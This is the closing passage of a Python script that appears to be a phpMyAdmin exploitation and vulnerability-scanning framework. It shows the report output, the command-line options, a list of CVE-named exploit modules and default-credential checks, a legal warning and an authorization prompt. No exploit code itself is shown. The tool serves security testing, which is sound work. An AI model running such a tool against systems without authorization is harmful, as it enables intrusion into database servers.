            for finding in critical:
                console.print(Panel(
                    f"[bold]{finding.id}[/bold]: {finding.title}\n"
                    f"{finding.description}\n"
                    f"[yellow]Remediation:[/yellow] {finding.remediation}",
                    border_style="red"
                ))
        
        console.print(f"\n[green]✓ Reports saved to: {self.output_dir}[/green]")
        console.print(f"[dim]Author: Sudeepa Wanigarathna[/dim]")

# ==================== CLI Interface ====================

def signal_handler(sig, frame):
    console.print("\n[yellow]⚠️ Scan interrupted by user[/yellow]")
    sys.exit(1)

def main():
    """Command-line interface"""
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description='PHPMyAdmin Security Assessment & Exploitation Framework v1.0',
        epilog='Author: Sudeepa Wanigarathna | For authorized testing only',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        'target',
        help='Target URL (e.g., https://example.com/phpmyadmin)'
    )
    
    parser.add_argument(
        '-o', '--output',
        default='reports',
        help='Output directory for reports (default: reports)'
    )
    
    parser.add_argument(
        '--list-exploits',
        action='store_true',
        help='List available exploits and exit'
    )
    
    parser.add_argument(
        '--exploit',
        help='Run specific exploit only (by name)'
    )
    
    parser.add_argument(
        '--no-scan',
        action='store_true',
        help='Skip vulnerability scanning, only run exploits'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='PHPMyAdmin Exploitation Framework v1.0\nAuthor: Sudeepa Wanigarathna'
    )
    
    args = parser.parse_args()
    
    # List exploits
    if args.list_exploits:
        console.print("[bold cyan]Available Exploits:[/bold cyan]")
        for exploit in [CVE_2015_6830_Exploit(), CVE_2018_19968_Exploit(), CVE_2019_11768_Exploit(), CVE_2020_5504_Exploit(), DefaultCredentialsExploit(), ConfigExposureExploit()]:
            console.print(f"  [green]•[/green] {exploit.name}: {exploit.description}")
            if exploit.cve:
                console.print(f"      [dim]CVE: {exploit.cve}[/dim]")
        sys.exit(0)
    
    # Validate URL
    if not urlparse(args.target).scheme:
        args.target = 'http://' + args.target
    
    # Security warning
    console.print(Panel.fit(
        f"{Fore.RED}⚠️  LEGAL WARNING{Style.RESET_ALL}\n"
        f"This tool contains EXPLOIT CODE for security testing.\n"
        f"Using this tool without authorization is a {Fore.RED}CRIMINAL OFFENSE{Style.RESET_ALL}.\n"
        f"You must have {Fore.RED}EXPLICIT WRITTEN PERMISSION{Style.RESET_ALL} from the system owner.\n"
        f"By continuing, you confirm you have such authorization.",
        border_style="red"
    ))
    
    confirm = input("\nConfirm authorization (yes/no): ")
    if confirm.lower() != 'yes':
        console.print("[red]✗ Authorization required. Exiting...[/red]")
        sys.exit(1)
    
    try:
        scanner = VulnerabilityScanner(args.target, args.output)
        asyncio.run(scanner.scan())
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Interrupted by user[/yellow]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()
